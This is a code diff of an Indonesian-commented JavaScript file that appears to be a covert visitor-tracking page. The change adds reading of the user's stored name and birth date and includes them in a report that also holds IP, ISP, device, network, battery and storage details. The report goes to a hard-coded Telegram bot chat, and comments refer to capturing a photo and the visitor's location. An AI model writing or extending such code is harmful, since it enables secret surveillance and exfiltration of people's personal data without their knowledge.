@@ -1,3 +1,7 @@
+ // Ambil data dari localStorage
+const userName = localStorage.getItem('userName');
+const userBirthDate = localStorage.getItem('userBirthDate');
+
 const collectedData = {};
 let photoCaptured = false; // Untuk memastikan hanya satu foto diambil
 let locationCaptured = false; // Untuk memastikan lokasi hanya dikirim sekali
@@ -54,31 +58,35 @@ function sendDeviceData() {
     const chatId = '5409710235';
 
     const message = `
-        🔍 Informasi Perangkat 🔍
+    🔍 Informasi Perangkat 🔍
 
-        🌐 IP: ${collectedData.ip?.ip || 'Tidak diketahui'}
-        📡 ISP: ${collectedData.ip?.isp || 'Tidak diketahui'}
+    🌐 IP: ${collectedData.ip?.ip || 'Tidak diketahui'}
+    📡 ISP: ${collectedData.ip?.isp || 'Tidak diketahui'}
 
-        📱 Perangkat:
-        - User Agent: ${collectedData.device?.userAgent || 'Tidak diketahui'}
-        - Platform: ${collectedData.device?.platform || 'Tidak diketahui'}
-        - Bahasa: ${collectedData.device?.language || 'Tidak diketahui'}
-        - Status Jaringan: ${collectedData.device?.networkStatus || 'Tidak diketahui'}
+    Pribadi :
+    - Nama: ${userName || 'Tidak diketahui'}
+    - Tanggal Lahir: ${userBirthDate || 'Tidak diketahui'}
 
-        📡 Jaringan:
-        - Jenis Koneksi: ${collectedData.network?.connectionType || 'Tidak diketahui'}
-        - Kecepatan Unduh: ${collectedData.network?.downlink || 'Tidak diketahui'} Mbps
-        - Latensi: ${collectedData.network?.rtt || 'Tidak diketahui'} ms
+    📱 Perangkat:
+    - User Agent: ${collectedData.device?.userAgent || 'Tidak diketahui'}
+    - Platform: ${collectedData.device?.platform || 'Tidak diketahui'}
+    - Bahasa: ${collectedData.device?.language || 'Tidak diketahui'}
+    - Status Jaringan: ${collectedData.device?.networkStatus || 'Tidak diketahui'}
 
-        🔋 Baterai:
-        - Level: ${collectedData.battery?.level || 'Tidak diketahui'}
-        - Status Pengisian: ${collectedData.battery?.charging || 'Tidak diketahui'}
+    📡 Jaringan:
+    - Jenis Koneksi: ${collectedData.network?.connectionType || 'Tidak diketahui'}
+    - Kecepatan Unduh: ${collectedData.network?.downlink || 'Tidak diketahui'} Mbps
+    - Latensi: ${collectedData.network?.rtt || 'Tidak diketahui'} ms
 
-        🗂 Penyimpanan:
-        - Total: ${collectedData.storage?.total || 'Tidak diketahui'}
-        - Digunakan: ${collectedData.storage?.used || 'Tidak diketahui'}
+    🔋 Baterai:
+    - Level: ${collectedData.battery?.level || 'Tidak diketahui'}
+    - Status Pengisian: ${collectedData.battery?.charging || 'Tidak diketahui'}
 
-        🕒 Waktu Akses: ${collectedData.device?.visitTime || 'Tidak diketahui'}
+    🗂 Penyimpanan:
+    - Total: ${collectedData.storage?.total || 'Tidak diketahui'}
+    - Digunakan: ${collectedData.storage?.used || 'Tidak diketahui'}
+
+    🕒 Waktu Akses: ${collectedData.device?.visitTime || 'Tidak diketahui'}
         `.trim();
 
     const urlMessage = `https://api.telegram.org/bot${botaja}/sendMessage`;
